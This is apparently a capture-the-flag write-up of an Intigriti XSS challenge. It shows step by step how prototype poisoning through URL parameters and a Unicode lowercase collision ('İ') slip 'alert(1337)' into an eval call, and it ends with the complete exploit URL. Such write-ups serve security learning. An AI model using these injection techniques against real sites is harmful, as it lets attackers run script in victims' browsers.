+ challenge link: https://challenge-0324.intigriti.io/challenge/index.html

+ We have a malicious fn in the runcmdfn() called eval(cmd). Giving a breakpoint to check how the fn works, we can see the cmd will eval to an alert. but we want alert(1337).
+ in contact infor, when we give name, contact and value, it is set as the property of the user.
```
function handleInputName(name, contact, value) {
      user[name] = { [contact]: value };
    }
```
+ as all the three values are user controlled and is merged to the user property they may be a chance of prototype pollution
+ but here it is prototype poisoning as parent object prototypes are immutable.
+ If we now provide __proto__, token and 1337 as our "set contact info" values, the resulting user object will be poisoned.
```
user['__proto__'] = {'token': '1337'}
```
+ https://challenge-0324.intigriti.io/challenge/index.html?setName=__proto__&setContact=token&setValue=1337&runTokenInfo=1
+ Still it doesnt pop as the length of value should be equal to 32.
+ Let's try a 32-character token: https://challenge-0324.intigriti.io/challenge/index.html?setName=__proto__&setContact=token&setValue=13371337133713371337133713371337&runTokenInfo=1
+ This alerts a pop up but we want just 1337

+ var str = `${user["token"]}${cmd}(hash)`.toLowerCase(); 
in this line, we have used toLowerCase(). Some Unicode characters are vulnerable to Case Mapping Collisions, when two different characters are uppercased or lowercased into the same character.
+ so we need to find a unicode character which we use for case mapping collision attack with toLowercase()
```
"İ".toLowerCase();
("i̇");
```
+ Notice that if we convert İ to hex, it is 2 bytes.
c4 b0
Whereas, if we convert i to hex, it is 1 byte.
69
+ Therefore, if we supply (16 * İ) + 16 char payload, it will pass the initial length checks since it's 32 characters.
However, once it's converted to lowercase, it will become a 48-byte string: (32 * i) + 16 char payload.
The next lines will separate the values using a slice operation. The iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii will land in the hash variable, and our 16-byte XSS payload will end up in the cmd variable.
+ However, our payload is only 11 characters.
alert(1337);
Since 16 + 11 = 27, it's not the 32 character token we need. So, we can add comments with // at the end to make it 32 chars
+ Final payload: https://challenge-0324.intigriti.io/challenge/index.html?setName=__proto__&setContact=token&setValue=İİİİİİİİİİİİİİİİalert(1337)//cat&runTokenInfo=1
